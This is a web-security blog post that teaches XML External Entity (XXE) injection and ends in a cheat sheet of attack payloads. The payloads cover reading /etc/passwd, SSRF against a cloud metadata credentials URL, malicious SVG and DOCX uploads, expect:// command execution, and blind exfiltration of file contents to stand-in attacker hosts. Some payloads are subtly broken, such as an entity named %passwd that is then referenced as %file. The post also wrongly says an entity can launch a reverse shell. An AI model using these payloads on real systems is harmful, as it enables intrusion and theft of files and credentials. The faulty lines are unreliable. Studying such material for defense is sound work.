+++
title = "XXE"
description = ""
type = ["posts","post"]
tags = [
    "web",
    "infosec",
]
date = "2021-06-07"
categories = [
    "web",
    "infosec",
]
series = ["web"]
[ author ]
  name = "Quac Tran"
+++
* [What is XXE](#what-is-xxe)
* [Types of XXE attacks](#types-of-xxe-attacks)
    * [XXE To retrieve files](#xxe-to-retrieve-files)
        * [Example](#example)
        * [XXE through the XInclude tag](#xxe-through-the-xinclude-tag)
        * [Exploiting XXE using SVG Files or docx files or xlsx files](#exploiting-xxe-using-svg-files-or-docx-files-or-xlsx-files)
    * [XXE Into SSRF](#xxe-into-ssrf)
    * [Blind XXE](#blind-xxe)
* [Payloads](#payloads)
* [Note](#note)
* [References](#references)
## What is XXE
XXE = XML eXternal Entities

XXE can occur when XML documents get parsed. We traditionally think of XXE vulnerabilities as uploading an XML file that includes an external entity, an example of this would be:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```
We might be able to upload this file if we save it as .xml into an application that process XML files but what some people don't know is that some other file types consist of XML files. 
## Types of XXE attacks
XXE can be abused to perform several types of attacks. It can even be chained into things like SSRF.
* XXE to retrieve files
* XXE to perform SSRF
* Blind XXE
### XXE To retrieve files
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<product>&xxe;</product>
<adress>&xxe;</adress>
```
In this example we first define the document type and in there we define a new Entity called "XXE". This entity is made to execute a system call. This can be anything like ls, a reverse shell or in this case a file inclusion. It will grab the /etc/passwd file.
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```
Next we will display that entity xxe into every possible field of our XML file. It's very important to insert your XXE entity into every single XML element. Any of them can be vulnerable as the developer has to filter ALL the fields indivually.\
#### Example
Request
![retrieve_file_1.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/retrieve_file_1.PNG)
![retrieve_file_2.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/retrieve_file_2.PNG)
From here, we can modify the XML data to add in an XXE to request the file we wish to target.
![retrieve_file_3.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/retrieve_file_3.PNG)
Response
![retrieve_file_4.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/retrieve_file_4.PNG)
#### XXE through the XInclude tag
Often, an attacker does not have full control over the XML data, but has control over an input passed into the data. In these cases, they can’t inject an entity before the XML parameters, which makes it appear impossible to conduct XXE attacks. Often however, it is possible to do a XXE attack with just access to a single parameter, using the XInclude feature of XML.\
XInclude can be thought of as a way of including another XML document within an existing one. Using this feature, we can include a XML component that defines our external entity, and use that to leak data from the server. In this situation, the data sent from the client includes only the parameters required to add to the XML.
![xinclude1.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/xinclude1.PNG)
To setup the XInclude, we need to inject data into the product ID parameter. The payload will look like below.
![xinclude2.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/xinclude2.PNG)
Without all of the encoding, the payload is:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```
#### Exploiting XXE using SVG Files or docx files or xlsx files
Gen docx file with python
![docx1.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/docx1.PNG)
A Docx file is mostly just zipped up xml files. We need to unzip the resume.docx file and modify the contents in “word/document.xml”. Then, save our changes back to resume.docx.
![docx2.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/docx2.PNG)
Two modifications are needed in document.xml.
```xml
<!DOCTYPE test [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
```
![docx4.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/docx4.PNG)
You can do the same with xlsx and svg
![svg.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/svg.PNG)
### XXE Into SSRF
A SSRF attack allows an attacker to perform server-side request forgery. This basically means that the attacker can make HTTP requests to any URL the server can access. This means that they can access URLs that they typically don’t have permission to access, which could potentially leak data.
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM
"http://intranet.cheeseshop.com"> ]>
```
### Blind XXE
The majority of XXE vulnerabilities in the wild will be blind XXE attacks. To detect these we can use an out of band webserver that we host ourselves and make the target do a callback to our server using the same technique we used previously in XXE into SSRF.
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com">
]>
```
If we detect blind XXE, we can exfiltrate data via OAST
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://webattacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Our first entity will grab the data file /etc/passwd and our second entity will make a callback to our server with the contents of the /etc/passwd file in a get parameter.
## Cheetsheat
```xml
 --------------------------------------------------------------------
using external entities:
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
--------------------------------------------------------------------
perform SSRF attacks:
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
--------------------------------------------------------------------
Blind XXE with out-of-band interaction:
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://burp-collab"> ]>
--------------------------------------------------------------------
Blind XXE with out-of-band interaction via XML parameter entities:
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://burp-collaborator> %xxe; ]>
--------------------------------------------------------------------
blind XXE to exfiltrate data using a malicious external DTD:
DTD file:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; test SYSTEM 'http://burp-collaborator/?a=%file;'>">
%eval;
%test;
XXE Payload:
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
-------------------------------------------------------------------
blind XXE to retrieve data via error messages:
DTD file:
<!ENTITY % passwd SYSTEM "file:///etc/passwd">
<!ENTITY % notvalid "<!ENTITY &#x25; test SYSTEM 'file:///invalid/%file;'>">
%notvalid;
%test;
XXE Payload:
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
-------------------------------------------------------------------
XInclude to retrieve files:
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
-------------------------------------------------------------------
XXE via image file upload:
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
--------------------------------------------------------------------
XXE inside SOAP body:
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
-------------------------------------------------------------------
XXE: Base64 Encoded:
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
-------------------------------------------------------------------
XXE inside SVG:
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
--------------------------------------------------------------------
```
## Note
Alway check file upload can inject xml
* profile pictures (.svg)
* banners (.svg)
* photo albums (.svg)
* XML imports (.xml)
* DOCX/XLSX imports (.docx/.xlsx)
* SOAP requests
* ...

## References

-[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)\
-[https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/](https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/)

